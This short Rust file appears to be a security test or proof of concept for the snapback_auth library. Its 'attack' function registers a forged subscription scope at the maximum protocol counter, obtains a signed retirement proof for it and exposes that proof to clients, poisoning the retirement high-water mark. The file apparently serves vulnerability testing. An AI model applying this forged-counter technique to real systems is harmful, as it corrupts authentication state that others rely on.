use snapback_auth::auth::invalidation::{
    MAX_PROTOCOL_COUNTER, ObligationRegistry, QueryNamespace, ScopeId,
};
use snapback_sync::local::live_protocol::LiveUnsubscribeOutput;

fn attack(registry: &mut ObligationRegistry, namespace: QueryNamespace) {
    let issuer_id = registry
        .installed_issuer()
        .authenticated()
        .issuer_id
        .clone();
    let forged_max_scope = ScopeId::Subscription {
        issuer_id,
        namespace,
        scope_sequence: MAX_PROTOCOL_COUNTER,
        connection_generation: 1,
        subscription_id: "attacker-selected-max".to_owned(),
    };

    // @attack
    registry
        .register_live_scope(forged_max_scope.clone(), "attacker-selected-owner")
        .expect("write caller-selected MAX into the signed retirement high-water");
    let prepared = registry
        .prepare_scope_retirement_authenticated(&forged_max_scope)
        .expect("prepare the absorbing MAX frontier");
    let proof = registry
        .commit_scope_retirement_authenticated(prepared)
        .expect("remove the forged scope")
        .expect("release the signed MAX proof");
    let output = LiveUnsubscribeOutput {
        subscription_id: "attacker-selected-max".to_owned(),
        disposed: true,
        receipt: None,
        scope_retirement: Some(proof),
    };
    let _client_visible_poison = serde_json::to_value(output).unwrap();

    // The vulnerable allocator is still at a low sequence after the signed
    // MAX frontier has become client-visible.
    let _legitimate_low_sequence = registry
        .installed_issuer()
        .reserve_scope_sequence()
        .unwrap();
}

fn main() {}
